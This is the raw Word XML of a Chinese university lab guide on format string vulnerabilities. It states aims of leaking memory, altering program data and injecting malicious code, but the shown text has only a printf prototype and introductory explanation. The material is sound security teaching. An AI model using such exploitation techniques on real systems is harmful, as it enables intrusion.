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3EEA" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:beforeLines="50" w:before="156" w:afterLines="50" w:after="156" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:b/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>实验指导书</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01118741" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:spacing w:beforeLines="50" w:before="156" w:afterLines="50" w:after="156" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>学院名称：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>网络空间安全</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">       </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>实验学时：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">      </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187E7FFD" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:autoSpaceDE w:val="0"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>课程名称：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="0" w:author="青风明月-崔剑" w:date="2023-05-04T20:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
            <w:lang w:bidi="ar"/>
          </w:rPr>
          <w:delText>操作系统原理与安全</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1" w:author="青风明月-崔剑" w:date="2023-05-04T20:27:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体" w:hint="eastAsia"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
            <w:lang w:bidi="ar"/>
          </w:rPr>
          <w:t>网络攻防实验</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>实验教师：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:ins w:id="2" w:author="青风明月-崔剑" w:date="2023-05-04T20:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
            <w:lang w:bidi="ar"/>
          </w:rPr>
          <w:t>崔剑、</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
          <w:lang w:bidi="ar"/>
        </w:rPr>
        <w:t>孙钰</w:t>
      </w:r>
      <w:del w:id="3" w:author="青风明月-崔剑" w:date="2023-05-04T20:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
            <w:lang w:bidi="ar"/>
          </w:rPr>
          <w:delText>、杨立群</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="4" w:author="青风明月-崔剑" w:date="2023-05-04T20:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="宋体" w:cs="黑体" w:hint="eastAsia"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
            <w:lang w:bidi="ar"/>
          </w:rPr>
          <w:t xml:space="preserve">  </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4800C94E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>实验题目：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>实验</w:t>
      </w:r>
      <w:del w:id="5" w:author="青风明月-崔剑" w:date="2023-05-04T20:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:eastAsia="黑体"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:delText>八</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="6" w:author="青风明月-崔剑" w:date="2023-05-04T20:28:00Z">
        <w:r>
          <w:rPr>
            <w:rFonts w:eastAsia="黑体" w:hint="eastAsia"/>
            <w:sz w:val="30"/>
            <w:szCs w:val="30"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>十二</w:t>
        </w:r>
      </w:ins>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>格式化字符串漏洞</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="613783BF" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:eastAsia="黑体" w:hAnsi="黑体" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>实验目的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29C626C8" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>理解格式化字符串漏洞的原理，并能够利用格式化字符串漏洞进行攻击。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CA8BD1" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>实验内容：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42629D81" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:adjustRightInd w:val="0"/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="480"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>学习格式化字符串漏洞的原理，并利用漏洞完成内存数据泄露、程序内存数据修改和恶意代码注入。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4129C4" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:b w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>整体实验要求：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AEC1E1E"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按照实验步骤完成实验。记录实验过程，加入自己的理解，形成实验报告。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4C3D89" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>实验步骤</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AE1AC68" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>prin</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>f</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="黑体" w:hAnsi="Times New Roman" w:hint="eastAsia"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>函数分析</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9FBA05"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实验内容</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20B01A0D"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理解</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>c++</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>语言中的</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hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>的参数传递原理，并对格式化字符串漏洞有初步的认识。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE41C19"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实验指导</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3016A77A" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251659264" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="2EE80F34" wp14:editId="179BF9E9">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>right</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>598805</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="4989830" cy="300355"/>
                <wp:effectExtent l="0" t="0" r="20320" b="23495"/>
                <wp:wrapTopAndBottom/>
                <wp:docPr id="4" name="文本框 4"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="4989830" cy="300355"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="6109" cap="flat" cmpd="sng">
                          <a:solidFill>
                            <a:srgbClr val="000000"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                          <a:miter/>
                          <a:headEnd type="none" w="med" len="med"/>
                          <a:tailEnd type="none" w="med" len="med"/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="12BB675C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t xml:space="preserve">int </w:t>
                            </w:r>
                            <w:proofErr w:type="spellStart"/>
                            <w:proofErr w:type="gramStart"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>printf</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>(</w:t>
                            </w:r>
                            <w:proofErr w:type="gramEnd"/>
                            <w:r>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                              <w:t>const char *format,...)</w:t>
                            </w:r>
                          </w:p>
                          <w:p w14:paraId="3A78DD42" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                            <w:pPr>
                              <w:wordWrap w:val="0"/>
                              <w:spacing w:before="75"/>
                              <w:ind w:left="103"/>
                              <w:jc w:val="left"/>
                              <w:rPr>
                                <w:rFonts w:ascii="Consolas"/>
                              </w:rPr>
                            </w:pPr>
                          </w:p>
                          <w:p w14:paraId="49CD0697" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                        </w:txbxContent>
                      </wps:txbx>
                      <wps:bodyPr lIns="0" tIns="0" rIns="0" bIns="0" upright="1">
                        <a:noAutofit/>
                      </wps:bodyPr>
                    </wps:wsp>
                  </a:graphicData>
                </a:graphic>
              </wp:anchor>
            </w:drawing>
          </mc:Choice>
          <mc:Fallback>
            <w:pict>
              <v:shapetype w14:anchorId="2EE80F34" id="_x0000_t202" coordsize="21600,21600" o:spt="202" path="m,l,21600r21600,l21600,xe">
                <v:stroke joinstyle="miter"/>
                <v:path gradientshapeok="t" o:connecttype="rect"/>
              </v:shapetype>
              <v:shape id="文本框 4" o:spid="_x0000_s1026" type="#_x0000_t202" style="position:absolute;left:0;text-align:left;margin-left:341.7pt;margin-top:47.15pt;width:392.9pt;height:23.65pt;z-index:-2516572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" filled="f" strokeweight=".16969mm">
                <v:textbox inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="12BB675C" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t xml:space="preserve">int </w:t>
                      </w:r>
                      <w:proofErr w:type="spellStart"/>
                      <w:proofErr w:type="gramStart"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>printf</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>(</w:t>
                      </w:r>
                      <w:proofErr w:type="gramEnd"/>
                      <w:r>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                        <w:t>const char *format,...)</w:t>
                      </w:r>
                    </w:p>
                    <w:p w14:paraId="3A78DD42" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A">
                      <w:pPr>
                        <w:wordWrap w:val="0"/>
                        <w:spacing w:before="75"/>
                        <w:ind w:left="103"/>
                        <w:jc w:val="left"/>
                        <w:rPr>
                          <w:rFonts w:ascii="Consolas"/>
                        </w:rPr>
                      </w:pPr>
                    </w:p>
                    <w:p w14:paraId="49CD0697" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00193C1A"/>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom" anchorx="margin"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>函数</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>可接受任意数目的参数，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Noto Sans" w:hAnsi="Noto Sans" w:cs="Noto Sans" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>并将</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="ae"/>
          <w:rFonts w:ascii="Noto Sans" w:hAnsi="Noto Sans" w:cs="Noto Sans" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>第一个参数作为格式化字符串，根据其来解析之后的参数</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Noto Sans" w:hAnsi="Noto Sans" w:cs="Noto Sans" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Tahoma" w:hint="eastAsia"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>其函数原型如下所示。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5982B1FC"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我们一般以如下形式使用</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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F2F64E" w14:textId="77777777" w:rsidR="00193C1A" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLineChars="200" w:firstLine="420"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
